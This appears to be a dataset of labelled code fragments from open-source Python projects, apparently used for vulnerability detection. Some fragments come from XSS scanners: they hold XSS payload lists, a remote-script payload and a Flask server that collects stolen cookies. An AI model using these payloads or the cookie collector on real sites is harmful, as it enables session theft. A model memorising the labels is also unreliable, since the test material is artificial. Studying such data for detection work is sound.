_(df.label), max_length", "label": 0}, {"snippet_id": 3629, "code": " vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method", "label": 0}, {"snippet_id": 17078, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 38338, "code": "'Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc,", "label": 0}, {"snippet_id": 32715, "code": "(md_fragment) self.wfile.write('</div>') self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write", "label": 0}, {"snippet_id": 3002, "code": " print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or", "label": 0}, {"snippet_id": 39497, "code": " must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()", "label": 0}, {"snippet_id": 50285, "code": ".init_session(\"ajax/comet\", remote_addr, self.sessionhandler) sess.csessid=csessid csession=_CLIENT_SESSIONS(session_key=sess.csessid) uid=csession and csession.get(\"webclient_authenticated_uid\", False) if", "label": 0}, {"snippet_id": 54176, "code": " text=\"Cookie:(Optional)\",background='light sky blue').grid(row=1) Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky blue').grid(row=3)", "label": 0}, {"snippet_id": 2592, "code": " post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads", "label": 0}, {"snippet_id": 29825, "code": "('getcerts') is not None and serv is not None: \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"ls -1t \"+cert_path+\" |grep pem\"] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('", "label": 0}, {"snippet_id": 5600, "code": "-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\" ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript", "label": 0}, {"snippet_id": 428, "code": " uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req", "label": 0}, {"snippet_id": 5141, "code": " cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return", "label": 0}, {"snippet_id": 41260, "code": " list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context", "label": 0}, {"snippet_id": 28387, "code": " config.get(sec, var) \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' %(sec, var)) \t\t\t\t\t def", "label": 0}, {"snippet_id": 32037, "code": " horizon import tables from openstack_dashboard import api class CreateMappingLink(tables.LinkAction): name=\"create\" verbose_name=_(\"Create Mapping\") url=\"horizon:identity:mappings:create\" classes=(\"ajax", "label": 0}, {"snippet_id": 47119, "code": "=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated', True) page_size=25 def delete_model(self, model): \"\"\"Delete a record.\"\"\" try: if model.json is None: return True record", "label": 1}, {"snippet_id": 2730, "code": ", \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads", "label": 0}, {"snippet_id": 21066, "code": "'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki", "label": 0}, {"snippet_id": 22912, "code": ".html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P", "label": 0}, {"snippet_id": 29510, "code": "\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor line in stdout: \t\tif ", "label": 0}, {"snippet_id": 25765, "code": ".Textarea, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text,", "label": 0}, {"snippet_id": 50560, "code": "(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0] if dmode=='init': return self.mode_init(request) elif dmode=='input': return self.mode_input(request) elif dmode=='receive': return", "label": 0}, {"snippet_id": 44599, "code": "-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data(", "label": 0}, {"snippet_id": 32957, "code": ".html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path) as f: self.wfile.write(f.read()) f.close() def _Read(self, relpath, relative_to=None): if relative_to", "label": 0}, {"snippet_id": 42823, "code": "\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link", "label": 0}, {"snippet_id": 18283, "code": "'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book", "label": 1}, {"snippet_id": 45870, "code": "=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run", "label": 0}, {"snippet_id": 43794, "code": " fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map", "label": 0}, {"snippet_id": 32198, "code": " argparse import codecs import os import re import socket import sys import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath(os.path.dirname(__file__))", "label": 0}, {"snippet_id": 14768, "code": "._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss", "label": 0}, {"snippet_id": 22978, "code": "\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^", "label": 0}, {"snippet_id": 23311, "code": "[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 5036, "code": ">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1", "label": 0}, {"snippet_id": 21155, "code": "), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$", "label": 0}, {"snippet_id": 37000, "code": " frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: ", "label": 0}, {"snippet_id": 46755, "code": " import create_pool from config import REDIS_URL from.base import BaseModel from.mc import cache, clear_mc from.user import GithubUser from.consts import K_COMMENT, ONE_HOUR from.react import ReactMixin", "label": 0}, {"snippet_id": 54838, "code": " ArticleDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\" model=Article success_url='/' def test_func(self): return self.request.user==self.get_object().author class CommentDelete(UserPassesTestMixin,", "label": 0}, {"snippet_id": 22699, "code": ".calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 53541, "code": "=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form", "label": 0}, {"snippet_id": 49072, "code": "\", \"\").split(\".\")] if self.query_order else[] self.current_columns_length=len(self.current_columns) @property def priority(self): if self.is_ordered(): return self.current_columns.index(self.column_id)", "label": 0}, {"snippet_id": 42753, "code": "(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append", "label": 0}, {"snippet_id": 13426, "code": "\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view", "label": 0}, {"snippet_id": 48723, "code": ") +\\ '&srid=' +str(int(request.GET['srid']))) else: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect(\"/admin?error=Missing%20reservation", "label": 0}, {"snippet_id": 739, "code": " xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\"", "label": 1}, {"snippet_id": 35626, "code": ") for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import", "label": 0}, {"snippet_id": 9425, "code": "'staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 26214, "code": ".settings.invoice_address_required: if data.get('is_business') and not data.get('company'): raise ValidationError(_('You need to provide a company name.')) if not data.get('is_business') and not data.get", "label": 0}, {"snippet_id": 14455, "code": ", ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status')", "label": 0}, {"snippet_id": 42948, "code": " fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname)", "label": 0}, {"snippet_id": 565, "code": "/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload", "label": 1}, {"snippet_id": 44047, "code": " __init__(self, using, index, doc_types, model, fields=None, **kwargs): self.using=using self.index=index self.doc_types=doc_types self._model=model if fields: self.fields=fields super(RTDFacetedSearch", "label": 0}, {"snippet_id": 50453, "code": "[]) if dataentries: return dataentries.pop(0) request.notifyFinish().addErrback(self._responseFailed, csessid, request) if csessid in self.requests: self.requests[csessid].finish() self.requests[csessid", "label": 0}, {"snippet_id": 4679, "code": "'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute", "label": 0}, {"snippet_id": 10295, "code": "-with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes", "label": 0}, {"snippet_id": 33477, "code": " from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname,", "label": 1}, {"snippet_id": 35494, "code": " fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname)", "label": 0}, {"snippet_id": 6728, "code": " \"\"\" Default language code to use when looking for web pages('en'). \"\"\" return self.config.get(self.section, 'default_language') @property def base_url(self): \"\"\" Base URL of the IdP. The default base URL", "label": 0}, {"snippet_id": 49710, "code": " kwargs['label']=None, field, label else: kwargs['field'], kwargs['label']=field, label columns.append(SmartColumn(**kwargs)) return columns @property def items(self): return[ SmartListItem(self, obj) for", "label": 0}, {"snippet_id": 47953, "code": "\nfrom datetime import date, time from django.shortcuts import redirect from django.http import HttpRequest, HttpResponseBadRequest from frontpage.models import Profile, Media, MediaUpload from frontpage", "label": 0}, {"snippet_id": 532, "code": "] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def", "label": 1}, {"snippet_id": 46010, "code": "-column span10\"}, ] def index(request, is_mobile=False): hue_collections=DashboardController(request.user).get_search_collections() collection_id=request.GET.get('collection') if not hue_collections or", "label": 0}, {"snippet_id": 51718, "code": ".group'}, {'name': 'constance.config', 'label': _('Configuration')}, ]}, {'label': _('Dashboard'), 'items':[ {'name': 'internet_nl_dashboard.account'}, {'name': 'internet_nl_dashboard.urllist'}, {'name':", "label": 1}, {"snippet_id": 25715, "code": "==Question.TYPE_NUMBER: field=forms.DecimalField( label=q.question, required=q.required, help_text=q.help_text, initial=initial.answer if initial else None, min_value=Decimal('0.00'), ) elif q.type==Question", "label": 0}, {"snippet_id": 6763, "code": " of the service. \"\"\" return self.config.get(self.section, 'base_url') @property def default_eppn_scope(self): \"\"\" The scope to append to any unscoped eduPersonPrincipalName attributes found on users in", "label": 0}, {"snippet_id": 23855, "code": " default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store", "label": 0}, {"snippet_id": 18807, "code": ".MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete'", "label": 0}, {"snippet_id": 42187, "code": "\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance", "label": 0}, {"snippet_id": 42512, "code": " db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry:", "label": 0}, {"snippet_id": 43463, "code": "'Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords", "label": 0}, {"snippet_id": 13674, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^", "label": 1}, {"snippet_id": 1542, "code": "'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\":", "label": 0}, {"snippet_id": 11619, "code": "'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$',", "label": 0}, {"snippet_id": 30414, "code": "') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif", "label": 0}, {"snippet_id": 8334, "code": ".migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS", "label": 0}, {"snippet_id": 21087, "code": "\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',", "label": 0}, {"snippet_id": 47772, "code": " The URL to forward to if nothing was specified :return: The crafted HttpResponse \"\"\" forward_url=default_forward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if not request.user", "label": 0}, {"snippet_id": 30923, "code": "'configver') \t\t\t \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>') \t\t \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment", "label": 1}, {"snippet_id": 49782, "code": "<script> ''' html=html+\"var socket=io.connect('http://{}:{}');\".format(HOST,PORT) html=html+''' try{setTimeout(` socket.emit('sendMSG','Connection Established.') `,1000) } catch{} socket.on('getMSG',function", "label": 0}, {"snippet_id": 48172, "code": "] category=request.POST[\"category\"] text=request.POST[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user, headline, category, text, file) except Exception as e:", "label": 0}, {"snippet_id": 40286, "code": ": \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email", "label": 0}, {"snippet_id": 27072, "code": ".write(r.content) for lfi_result in lfi_expect: if r.content.find(lfi_result)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def scan_for_forms", "label": 1}, {"snippet_id": 19606, "code": "-pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self)", "label": 0}, {"snippet_id": 23671, "code": " import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss", "label": 1}, {"snippet_id": 28101, "code": " cgi import os import http.cookies import funct import sql from jinja2 import Environment, FileSystemLoader env=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html')", "label": 1}, {"snippet_id": 4971, "code": "<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& ", "label": 0}, {"snippet_id": 39535, "code": "): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get", "label": 0}, {"snippet_id": 29453, "code": "%s/tcp --permanent' % bind) \t\t\t\t \tfirewalld_commands.append('sudo firewall-cmd --reload') \treturn firewalld_commands \t def check_haproxy_config(serv): \timport sql \tcommands=[ \"haproxy -q -c -f %s\" % sql", "label": 0}, {"snippet_id": 38623, "code": ": \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t", "label": 0}, {"snippet_id": 51799, "code": " has to be configured on the OS level, and needs to be different than the ' 'default key provided. Please create a new key. Instructions are listed here:' 'https://github.com/pyca/cryptography. In short", "label": 0}, {"snippet_id": 7550, "code": "+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 49572, "code": ", list_display=None, list_filter=None, list_search=None, search_query_param=None, ordering_query_param=None): self.object_list=object_list self.model=object_list.model self.query_params=query_params or", "label": 0}, {"snippet_id": 23325, "code": "=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE", "label": 0}, {"snippet_id": 2545, "code": ".body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request", "label": 1}, {"snippet_id": 45096, "code": " workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in", "label": 0}, {"snippet_id": 39841, "code": " fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname)", "label": 0}, {"snippet_id": 22436, "code": "+=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views", "label": 0}, {"snippet_id": 10849, "code": " or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly", "label": 0}, {"snippet_id": 33308, "code": "(r'/build/<build_id:\\d+>', ViewBuildHandler), ] routes.extend(endpoints_webapp2.api_routes(endpoints_services)) routes.extend( endpoints_webapp2.api_routes(endpoints_services, base_path='/api') ) prpc_server", "label": 0}, {"snippet_id": 51914, "code": ":DatabaseScheduler' CELERY_BROKER_CONNECTION_MAX_RETRIES=1 CELERY_BROKER_CONNECTION_RETRY=False CELERY_RESULT_EXPIRES=timedelta(hours=4) CELERY_WORKER_PREFETCH_MULTIPLIER=2 CELERY_WORKER_CONCURRENCY=10 CELERY_ACKS_LATE", "label": 0}, {"snippet_id": 33346, "code": "(auth.prpc_interceptor) prpc_server.add_service(api.BuildsApi()) return[ webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases', expiration.CronExpireBuildLeases), webapp2.Route(r'/internal/cron", "label": 0}, {"snippet_id": 15228, "code": " only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes,", "label": 0}, {"snippet_id": 21978, "code": " if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 53994, "code": ".method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n----------------", "label": 0}, {"snippet_id": 33646, "code": ".content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name", "label": 0}, {"snippet_id": 36360, "code": " \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel", "label": 0}, {"snippet_id": 14275, "code": "'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib", "label": 0}, {"snippet_id": 2885, "code": ": try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url", "label": 0}, {"snippet_id": 26337, "code": " self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country is currently", "label": 0}, {"snippet_id": 22218, "code": ".views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name", "label": 0}, {"snippet_id": 13742, "code": ")/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$", "label": 1}, {"snippet_id": 53876, "code": ".method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n----------------", "label": 0}, {"snippet_id": 52870, "code": " RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail))", "label": 0}, {"snippet_id": 46187, "code": " 0} if request.GET.get('format', 'plain')=='json': return JsonResponse({ 'collection': collection.get_props(request.user), 'query': query, 'initial':{ 'collections': collections, 'layout': DEFAULT_LAYOUT", "label": 0}, {"snippet_id": 53895, "code": "\\t[ Steal Cookie Using Xss..]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route", "label": 1}, {"snippet_id": 24621, "code": " combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting", "label": 0}, {"snippet_id": 51613, "code": "), }, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'production':{ 'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' +DB_ENGINE), 'NAME", "label": 0}, {"snippet_id": 17289, "code": "'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo'", "label": 0}, {"snippet_id": 21046, "code": " settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create", "label": 0}, {"snippet_id": 27179, "code": " hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\<form\\>\"', line, re.M|re.I) m_action 